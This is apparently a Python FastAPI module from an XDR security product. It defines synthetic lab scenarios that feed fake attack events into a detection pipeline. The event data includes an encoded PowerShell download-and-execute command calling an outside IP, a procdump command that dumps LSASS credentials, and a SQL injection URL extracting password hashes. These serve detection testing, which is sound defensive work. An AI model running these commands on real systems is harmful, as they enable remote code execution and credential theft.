"""
CyberFusion XDR Enterprise - LAB MODE Synthetic Test Harness
Provides isolated lab test scenarios. LAB data is strictly segregated from LIVE production dashboards.
"""
from fastapi import APIRouter, HTTPException
from typing import Dict, Any, List
import time
import uuid
from app.services.pipeline import PipelineOrchestrator

router = APIRouter()

LAB_SCENARIOS = {
    "APT29_COZY_BEAR": {
        "name": "APT29 Multi-Stage Execution & C2 Beaconing",
        "description": "Simulates PowerShell download cradle, LSASS credential access, and outbound beacon to known Cozy Bear C2 IP.",
        "events": [
            {
                "data_source": "EDR",
                "category": "process",
                "action": "process_create",
                "hostname": "LAB-WS-DEVELOPER-01",
                "user_identity": "jdoe_lab",
                "process_name": "powershell.exe",
                "process_pid": 4892,
                "parent_process": "winword.exe",
                "command_line": "powershell.exe -nop -w hidden -enc aWV4IChOZXctT2JqZWN0IE5ldC5XZWJDbGllbnQpLkRvd25sb2FkU3RyaW5nKCdodHRwOi8vMTg1LjIyMC4xMDEuNS9wYXlsb2FkJyk="
            },
            {
                "data_source": "EDR",
                "category": "process",
                "action": "credential_access",
                "hostname": "LAB-WS-DEVELOPER-01",
                "user_identity": "jdoe_lab",
                "process_name": "procdump.exe",
                "process_pid": 5120,
                "parent_process": "powershell.exe",
                "command_line": "procdump.exe -ma lsass.exe C:\\temp\\lsass.dmp"
            },
            {
                "data_source": "NDR",
                "category": "network",
                "action": "outbound_connection",
                "hostname": "LAB-WS-DEVELOPER-01",
                "source_ip": "10.0.15.42",
                "dest_ip": "185.220.101.5",
                "dest_port": 443,
                "protocol": "TCP"
            }
        ]
    },
    "BRUTE_FORCE_BURST": {
        "name": "IAM Password Spray & Credential Stuffing Burst",
        "description": "Fires 6 rapid failed authentication events against corporate identity to trigger threshold detection.",
        "events": [
            {
                "data_source": "IAM",
                "category": "authentication",
                "action": "logon_failed",
                "user_identity": "admin_service@lab.internal",
                "source_ip": "194.26.29.11",
                "hostname": "LAB-DC-01"
            } for _ in range(6)
        ]
    },
    "WAF_SQLI_PROBE": {
        "name": "External WAF SQL Injection & Command Probe",
        "description": "Sends HTTP request containing malicious SQL injection payload against web application interface.",
        "events": [
            {
                "data_source": "WAF",
                "category": "web_attack",
                "action": "http_request",
                "source_ip": "185.220.101.5",
                "dest_ip": "10.0.1.50",
                "http_method": "GET",
                "url": "/api/users?id=1' UNION SELECT username, password_hash FROM admin_users--",
                "http_status": 403
            }
        ]
    }
}

@router.get("/scenarios")
async def get_lab_scenarios():
    """List available laboratory simulation scenarios."""
    return [
        {"id": k, "name": v["name"], "description": v["description"], "event_count": len(v["events"])}
        for k, v in LAB_SCENARIOS.items()
    ]

@router.post("/simulate/{scenario_id}")
async def run_lab_simulation(scenario_id: str):
    """
    Execute synthetic scenario strictly isolated in LAB mode.
    LAB data is tagged and NEVER mixed with LIVE data.
    """
    if scenario_id not in LAB_SCENARIOS:
        raise HTTPException(status_code=404, detail="Lab scenario not found")

    scenario = LAB_SCENARIOS[scenario_id]
    processed_events = []

    for ev in scenario["events"]:
        res = await PipelineOrchestrator.process_raw_event(
            raw_event=ev,
            data_source=ev.get("data_source", "LAB_GENERATOR"),
            mode="LAB", # Strictly isolated LAB MODE!
            tenant_id="tenant-enterprise-secops"
        )
        processed_events.append(res)

    return {
        "status": "LAB_SCENARIO_EXECUTED",
        "scenario": scenario["name"],
        "mode": "LAB (SEGREGATED FROM PRODUCTION)",
        "events_dispatched": len(processed_events)
    }
